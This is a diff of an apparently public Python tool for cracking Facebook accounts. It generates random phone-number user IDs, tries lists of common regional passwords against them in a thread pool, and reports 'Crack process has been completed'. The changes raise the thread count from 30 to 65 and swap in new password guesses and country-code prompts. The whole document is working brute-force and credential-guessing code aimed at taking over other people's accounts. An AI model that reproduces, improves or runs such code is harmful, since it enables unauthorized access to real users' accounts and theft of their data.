@@ -198,7 +198,7 @@ logo = """
 \033[1;37m[+] \033[1;37mON FACEBOK   :  \033[1;37mRaziqullah saadat
 \033[1;37m[+] \033[1;37mON GITHUB    :  \033[1;37mRaziq-saadat
 \033[1;37m[+] \033[1;37mTOOL STATUS  :  \033[1;37mFREE
-\033[1;37m[+] \033[1;37mTOOL VIRSION :  \033[1;31m7.0.5
+\033[1;37m[+] \033[1;37mTOOL VIRSION :  \033[1;31m7.0.4
 \x1b[1;97m[+]═══════════════════════════════════════════"""
 loop = 0
 oks = []
@@ -245,7 +245,7 @@ def random_number1():
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		uid.append(nmp)
-	with ThreadPool(max_workers=30) as yaari:
+	with ThreadPool(max_workers=65) as yaari:
 		os.system('clear')
 		print(logo)
 		tl = str(len(uid))
@@ -255,7 +255,7 @@ def random_number1():
 		print('[+]═══════════════════════════════════════════') 
 		for guru in uid:
 			uid = kode+guru
-			pwx = [kode, kode+guru,'afghan123','kabul123','kabul12345','kabul1234','khan123','khan1234','khankhan123','khan1234','1234567','khankhan1122','khankhan12345','khankhankhan','786786','khan1122','khan123456','khankhankhan1122']
+			pwx = [kode, kode+guru,'khankhan','khan1122','khankhan','khan12','khan123','khankhan123','khan1234','1234567','khankhan1122','khankhan12345','khankhankhan','786786','khan1122','khan123456','khankhankhan1122']
 			yaari.submit(mcrack,uid,pwx,tl)
 	print(47*"—") 
 	print('[✓] Crack process has been completed')
@@ -285,7 +285,7 @@ def random_number2():
 		print('[+]═══════════════════════════════════════════') 
 		for guru in uid:
 			uid = kode+guru
-			pwx = [guru,kode,'afghan123','kabul123','kabul12345','kabul1234','khan123','khan1234','khankhan123','khan1234','1234567','khankhan1122','khankhan12345','khankhankhan','786786','khan1122','khan123456','khankhankhan1122']
+			pwx = [guru,kode,'khan12','khan12345','khankhan12345','khankhan','khankhan','khan12','khan123','khankhan123','khan1234','1234567','khankhan1122','khankhan12345','khankhankhan','786786','khan1122','khan123456','khankhankhan1122']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print(47*"-")
 	print('[✓] Crack process has been completed')
@@ -315,7 +315,7 @@ def random_number6():
 		print('[+]═══════════════════════════════════════════') 
 		for guru in uid:
 			uid = kode+guru
-			pwx = [kode, kode+guru,'afghan123','kabul123','kabul12345','kabul1234','khan123','khan1234','khankhan123','khan1234','1234567','khankhan1122','khankhan12345','khankhankhan','786786','khan1122','khan123456','khankhankhan1122'']
+			pwx = [kode, kode+guru,'khankhan','khan12','khan123','khankhan123','khan1234','1234567','khankhan1122','khankhan12345','khankhankhan','786786','khan1122','khan123456','khankhankhan1122']
 			yaari.submit(mcrack,uid,pwx,tl)
 	print(47*"—") 
 	print('[✓] Crack process has been completed')
@@ -396,7 +396,7 @@ def random_number3():
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		uid.append(nmp)
-	with ThreadPool(max_workers=30) as yaari:
+	with ThreadPool(max_workers=65) as yaari:
 		os.system('clear')
 		print(logo)
 		tl = str(len(uid))
@@ -406,7 +406,7 @@ def random_number3():
 		print('[+]═══════════════════════════════════════════') 
 		for guru in uid:
 			uid = kode+guru
-			pwx = [guru,'afghan123','kabul123','kabul12345','kabul1234','khan123','khan1234','khankhan123','khan1234','1234567','khankhan1122','khankhan12345','khankhankhan','786786','khan1122','khan123456','khankhankhan1122'']
+			pwx = [guru,'khankhan','khan12','khan123','khankhan123','khan1234','1234567','khankhan1122','khankhan12345','khankhankhan','786786','khan1122','khan123456','khankhankhan1122']
 			yaari.submit(fcrack,uid,pwx,tl)
 	print(47*"-")
 	print('[✓] Crack process has been completed')
@@ -436,7 +436,7 @@ def random_number4():
 		print('[+]═══════════════════════════════════════════') 
 		for guru in uid:
 			uid = kode+guru
-			pwx = [guru,'afghan123','kabul123','kabul12345','kabul1234','khan123','khan1234','khankhan123','khan1234','1234567','khankhan1122','khankhan12345','khankhankhan','786786','khan1122','khan123456','khankhankhan1122']
+			pwx = [guru,'khankhan','khan1122','khan12','khan12345','khankhan','khan12','khan123','khankhan123','khan1234','1234567','khankhan1122','khankhan12345','khankhankhan','786786','khan1122','khan123456','khankhankhan1122']
 			yaari.submit(mcrack,uid,pwx,tl)
 	print(50*'-')
 	print('Crack process has been completed')
@@ -455,7 +455,7 @@ def random_number5():
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		uid.append(nmp)
-	with ThreadPool(max_workers=30) as yaari:
+	with ThreadPool(max_workers=65) as yaari:
 		os.system('clear')
 		print(logo)
 		tl = str(len(uid))
@@ -465,7 +465,7 @@ def random_number5():
 		print('[+]═══════════════════════════════════════════') 
 		for guru in uid:
 			uid = kode+guru
-			pwx = [guru,'afghan123','kabul123','kabul12345','kabul1234','khan123','khan1234','khankhan123','khan1234','1234567','khankhan1122','khankhan12345','khankhankhan','786786','khan1122','khan123456','khankhankhan1122']
+			pwx = [guru,'aliali','ali1122','i love you','khankhan','khan12','khan123','khankhan123','khan1234','1234567','khankhan1122','khankhan12345','khankhankhan','786786','khan1122','khan123456','khankhankhan1122']
 			yaari.submit(mcrack,uid,pwx,tl)
 	print(50*'-')
 	print('Crack process has been completed')
@@ -529,7 +529,7 @@ def fcrack(uid,pwx,tl):
 def method3():
 	user=[]
 	os.system('clear');print(logo)
-	print('[+] Use Three Digit Code (9378,9379)')
+	print('[+] Use Three Digit Code (017,018)')
 	print(47*'-')
 	kode = input('[?] Input Code : ')
 	print(47*'-')
